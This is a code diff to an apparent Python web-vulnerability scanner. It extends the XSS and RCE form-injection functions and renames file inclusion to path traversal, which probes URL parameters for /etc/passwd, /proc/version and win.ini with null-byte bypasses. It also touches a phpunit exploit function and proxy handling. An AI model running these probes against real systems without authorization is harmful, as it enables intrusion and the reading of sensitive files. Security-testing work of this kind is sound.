@@ -116,7 +116,7 @@ def setup_to_submit(form):
    d.update({x["name"]:x["value"]})
  return d,f
 
-def xss_submit(parsed,payload,replaceble_parameters,debug=False):
+def xss_submit(parsed,payload,replaceble_parameters,debug=False,enctype='application/x-www-form-urlencoded'):
   '''
    this function is for xss test with GET requests.
 
@@ -127,12 +127,17 @@ def xss_submit(parsed,payload,replaceble_parameters,debug=False):
     if x==y:
      for z in replaceble_parameters[y]:
       d[x]=d[x].replace(z[0],z[1])
-  parsed[1].update({"Referer":parsed[0]["action"],"Origin":parsed[0]["action"].split("://")[0]+"://"+parsed[0]["action"].split("://")[1].split("/")[0]})
+  if not fi:
+   parsed[1].update({"Content-Type":enctype,"Referer":parsed[0]["action"],"Origin":parsed[0]["action"].split("://")[0]+"://"+parsed[0]["action"].split("://")[1].split("/")[0]})
+  else:
+   parsed[1].update({"Referer":parsed[0]["action"],"Origin":parsed[0]["action"].split("://")[0]+"://"+parsed[0]["action"].split("://")[1].split("/")[0]})
   if debug==True:
    for x in d:
     print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
    for x in fi:
     print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,fi[x]))
+  if 'application/json' in enctype:
+   d=json.dumps(d)
   if parsed[0]["method"]=="get":
    try:
      c=requests.get(parsed[0]["action"], params= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False).text
@@ -224,10 +229,10 @@ def xss(u,payload=None,unicode_random_level=0,js_function="alert",replaceble_par
      extr=[]
      l=[]
      for x in l1['inputs']:
-       if x["type"] in ["file","text","textarea","email","tel","search","url","password","number","select"]:#any input type that accept direct input from keyboard
+       if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"]:#any input type that accept direct input from keyboard
         i=x["name"]
         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension)
-        xss_res=xss_submit(parsed_form,xp,replaceble_parameters,debug=debug)
+        xss_res=xss_submit(parsed_form,xp,replaceble_parameters,debug=debug,enctype=l1['enctype'])
         if xss_res[0]==True:
           x="parameter: '"+i+"' => [+]Payload was found"
           vul.append((i,xss_res[1]))
@@ -246,7 +251,7 @@ def xss(u,payload=None,unicode_random_level=0,js_function="alert",replaceble_par
    return {"Payload":xp,"Page":target_page,"Output":dic}
 
 
-def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False):
+def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False,enctype='application/x-www-form-urlencoded'):
   '''
    this function is for xss test with GET requests.
 
@@ -262,8 +267,13 @@ def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False):
     print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
    for x in fi:
     print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,fi[x]))
+  if 'application/json' in enctype:
+   d=json.dumps(d)
   t=time.time()
-  parsed[1].update({"Referer":parsed[0]["action"],"Origin":parsed[0]["action"].split("://")[0]+"://"+parsed[0]["action"].split("://")[1].split("/")[0]})
+  if not fi:
+   parsed[1].update({"Content-Type":enctype,"Referer":parsed[0]["action"],"Origin":parsed[0]["action"].split("://")[0]+"://"+parsed[0]["action"].split("://")[1].split("/")[0]})
+  else:
+   parsed[1].update({"Referer":parsed[0]["action"],"Origin":parsed[0]["action"].split("://")[0]+"://"+parsed[0]["action"].split("://")[1].split("/")[0]})
   if parsed[0]["method"]=="get":
    try:
      c=requests.get(parsed[0]["action"], params= d,headers = parsed[1],proxies=parsed[2],timeout=parsed[3], verify=False).text
@@ -429,10 +439,10 @@ def rce(u,payload_index=0,save_to_file=None,injection={"code":"php"},file_extens
      l=[]
      for x in l1['inputs']:
       try:
-       if x["type"] in ["file","text","textarea","email","tel","search","url","password","number","select"]:#any input type that accept direct input from keyboard
+       if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"]:#any input type that accept direct input from keyboard
         i=x["name"]
         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension)
-        _res=rce_submit(parsed_form,xp,based_on,replaceble_parameters,debug=debug)
+        _res=rce_submit(parsed_form,xp,based_on,replaceble_parameters,debug=debug,enctype=l1['enctype'])
         if _res[0]==True:
           x="parameter: '"+i+"' => [+] Vulnerable !!"
           vul.append((i,_res[1]))
@@ -465,14 +475,16 @@ def valid_parameter(parm):
  except:
   return True
 
-def file_inclusion_link(u,null_byte=False,bypass=False,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
+def path_traversal_link(u,null_byte=False,bypass=False,linux_file=0,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
  '''
    this function is for FI vulnerability test using a link
 '''
+ linux_files=['{}etc{}passwd','{}proc{}version']
  if proxy:
-  proxy={'http':'http://'+proxy}
+  proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if proxies:
-  proxy={'http':'http://'+random.choice(proxies)}
+  prx=random.choice(proxies)
+  proxy={'http':'http://'+prx,'https':'http://'+prx}
  if user_agent:
    us=user_agent
  else:
@@ -485,7 +497,7 @@ def file_inclusion_link(u,null_byte=False,bypass=False,target_os="linux",file_wr
   return (False,'')
  else:
   if target_os.lower()=="linux":
-   l='{}etc{}passwd'
+   l=linux_files[linux_file]
   else:
    l='c:{}windows{}win.ini'
   if bypass==True:
@@ -498,13 +510,13 @@ def file_inclusion_link(u,null_byte=False,bypass=False,target_os="linux",file_wr
    l+="%00"
   try:
     r=requests.get(u.format(l),headers=heads,proxies=proxy,timeout=timeout, verify=False)
-    if (len(re.findall(r'[a-zA-Z0-9_]*:[a-zA-Z0-9_]*:[\d]*:[\d]*:[a-zA-Z0-9_]*:/', r.text))>0) or (all( x in r.text for x in ["; for 16-bit app support","[fonts]","[extensions]","[mci extensions]","[files]","[Mail]"])==True):
+    if (len(re.findall(r'[a-zA-Z0-9_]*:[a-zA-Z0-9_]*:[\d]*:[\d]*:[a-zA-Z0-9_]*:/', r.text))>0) or (all( x in r.text for x in ["; for 16-bit app support","[fonts]","[extensions]","[mci extensions]","[files]","[Mail]"])==True) or (all( x in r.text for x in ["Linux version","(gcc version"])==True):
      return (True,r.url)
   except Exception as e:
     pass
  return (False,'')
  
-def file_inclusion(u,null_byte=False,bypass=False,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None): 
+def path_traversal(u,null_byte=False,bypass=False,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None): 
  res=[]
  if u.split("?")[0][-1]!="/" and '.' not in u.split("?")[0].rsplit('/', 1)[-1]:
     u=u.replace('?','/?')
@@ -524,20 +536,25 @@ def file_inclusion(u,null_byte=False,bypass=False,target_os="linux",file_wrapper
    for y in x[3]:
     if valid_parameter(y[1])==True:
      trgt=ur.replace(y[0]+"="+y[1],y[0]+"={}")
-     q=file_inclusion_link(trgt,null_byte=null_byte,bypass=bypass,target_os="linux",file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
+     q=path_traversal_link(trgt,null_byte=null_byte,bypass=bypass,linux_file=0,target_os="linux",file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
      if q[0]==True:
       if q[1] not in res:
         res.append(q[1])
      else:
-      q=file_inclusion_link(trgt,null_byte=null_byte,bypass=bypass,file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent,target_os="windows")
+      q=path_traversal_link(trgt,null_byte=null_byte,bypass=bypass,linux_file=1,target_os="linux",file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
       if q[0]==True:
-       if q[1] not in res:
-        res.append(q[1])
+        if q[1] not in res:
+         res.append(q[1])
+      else:
+        q=path_traversal_link(trgt,null_byte=null_byte,bypass=bypass,file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent,target_os="windows")
+        if q[0]==True:
+         if q[1] not in res:
+          res.append(q[1])
  return res
 
 def clickjacking(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False):
  if proxy:
-  proxy={'http':'http://'+proxy}
+  proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if user_agent:
    us=user_agent
  else:
@@ -561,7 +578,7 @@ def clickjacking(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False
 
 def hsts(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False):
  if proxy:
-  proxy={'http':'http://'+proxy}
+  proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if user_agent:
    us=user_agent
  else:
@@ -628,7 +645,7 @@ def cors_reflection(u,proxy=None,timeout=10,user_agent=None,cookie=None,origin="
  a=None
  b=None
  if proxy:
-  proxy={'http':'http://'+proxy}
+  proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if user_agent:
    us=user_agent
  else:
@@ -656,7 +673,7 @@ def cors_wildcard(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=Fals
  a=None
  b=None
  if proxy:
-  proxy={'http':'http://'+proxy}
+  proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if user_agent:
    us=user_agent
  else:
@@ -684,7 +701,7 @@ def cors_null(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False):
  a=None
  b=None
  if proxy:
-  proxy={'http':'http://'+proxy}
+  proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if user_agent:
    us=user_agent
  else:
@@ -1010,7 +1027,7 @@ def exposed_env(u,user_agent=None,cookie=None,proxies=None,proxy=None,path="",br
   else:
    hea={'User-Agent': us}
   if proxy:
-   proxy={'http':'http://'+proxy}
+   proxy={'http':'http://'+proxy,'https':'http://'+proxy}
   try:
    if urlparse(u).path=="/":
     u+=path+'.env'
@@ -1051,7 +1068,7 @@ def vulners_search(software,file_name="",max_vulnerabilities=100,version="",soft
   else:
    hea={'User-Agent': us}
   if proxy:
-   proxy={'http':'http://'+proxy}
+   proxy={'http':'http://'+proxy,'https':'http://'+proxy}
   try:
    ver=""
    if version:
@@ -1095,7 +1112,7 @@ def shodan_report(ip,api_key,file_name="shodan_report"):
 
 def phpunit_exploit(u,path='/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',user_agent=None,cookie=None,timeout=10,proxy=None):
  if proxy:
-  proxy={'http':'http://'+proxy}
+  proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if u[len(u)-1]=='/':
   u=u[0:len(u)-1]
  if user_agent:
